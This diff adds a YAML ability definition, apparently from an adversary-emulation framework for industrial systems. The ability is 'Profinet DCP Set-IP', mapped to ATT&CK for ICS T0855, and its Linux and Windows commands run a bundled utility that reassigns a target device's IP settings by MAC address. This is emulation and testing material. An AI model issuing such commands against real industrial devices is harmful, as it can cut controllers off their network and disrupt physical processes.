@@ -1,0 +1,29 @@
+---
+
+- id: 132898e3-c2cc-4af4-954f-06ac99566a8f
+  name: Profinet DCP Set-IP
+  description: |
+    Profinet DCP 
+    (Service ID: 0x04=Set, Service Type: 0x00=Request, Option: 0x01=IP, Suboption: 0x02=IP parameter)
+
+    Sets the network configuration (IP address, subnet mask, gateway) of a target device specified by MAC address.  
+  tactic: impair-process-control
+  technique:
+    attack_id: T0855
+    name: 'Unauthorized Command Message'
+  repeatable: True
+  platforms:
+    linux:
+      sh:
+        timeout: 360
+        command: |
+          ./dcp_utility set_ip #{dcp.target.mac} #{dcp.target.ip} #{dcp.target.subnetmask} #{dcp.target.gateway} 
+        payloads:
+        - dcp_utility
+    windows:
+      psh, cmd:
+        timeout: 360
+        command: |
+          .\dcp_utility.exe set_ip #{dcp.target.mac} #{dcp.target.ip} #{dcp.target.subnetmask} #{dcp.target.gateway}
+        payloads:
+        - dcp_utility.exe
